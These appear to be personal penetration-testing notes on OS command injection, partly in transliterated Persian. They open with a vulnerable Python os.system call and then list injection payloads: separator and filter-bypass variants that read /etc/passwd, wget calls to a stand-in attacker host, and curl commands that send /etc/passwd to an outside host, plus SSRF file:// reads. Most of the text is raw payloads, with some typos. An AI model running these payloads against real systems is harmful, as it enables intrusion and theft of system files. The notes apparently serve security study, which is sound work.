Code example, the ==video_name== comes from user input:
```shell
os.system("/bin/ffmpeg -i {} -c:a copy -c:v vp9 -r 30 /files/user/{}/videos".format(video_name, session.get('user_id')))
```
Detection Phase:
```shell
; cat /etc/passwd
&& cat /etc/passwd
| cat /etc/passwd
|| cat /etc/passwd
`cat /etc/passwd
$(cat /etc/passwd)
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat$IFS/etc/passwd
cat ${HOME:0:1}etc${HOME:0:1}passwd
```
Out of Band Technique
```shell
; wget https://attacket.com/00B
&& wget https://attacket.com/00B
| wget https://attacket.com/00B
|| wget https://attacket.com/00B
'wget https://attacket.com/00B'
$(wget https://attacket.com/00B)
{wget,https://attacket.com/00B}
```
example:
```shell
0 | id
curl http://icollab.info:2121 --data-binary @/etc/passwd
console -> inspector -> input -->textarea --> mitonam enter bezanam va chand dastor run konam
#Dec 10   Hex 0A  Enter# 
#URL encode
vim a.sh(
whoami
id
)
chmod +x a.sh
./a.sh(
javab whoami
javab id
)#cat a.sh | xxd    
time.ir(enter) -->encod
time.ir%0aid  -->javab
time.ir
id
```
partial command injection
```shell
curl curl http://icollab.info:2121 -- data-binary @/etc/passwd
#curl aval be icollab bad ye suich dare bara etc/passwd
#command injection nist
#vali bahash mishe file khond
https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md

curl $INPUT --data-binary @/etc/passwd #ersal file passwd be $INPUT
curl file:///etc/passwd (SSRF) -->Local File disolosure
curl file\:/etc/passwd  (fail) scheme:// ->smuggling
{file}:/etc/passwd (auto correct)
```
## payloads
```shell
- (filter) can I use the corresponding url encoded value instead? in 5%

salam%20salam -> web server -> url decode -> salam salam
web application -> salam salam -> filter apply
```
